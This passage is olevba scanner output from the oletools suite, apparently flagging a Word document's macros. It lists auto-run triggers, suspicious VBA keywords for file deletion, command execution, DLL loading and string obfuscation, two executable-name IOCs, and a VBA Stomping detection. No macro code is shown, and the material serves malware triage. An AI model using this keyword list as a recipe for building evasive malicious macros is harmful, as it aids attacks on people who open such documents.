|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBADLG.DLL          |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

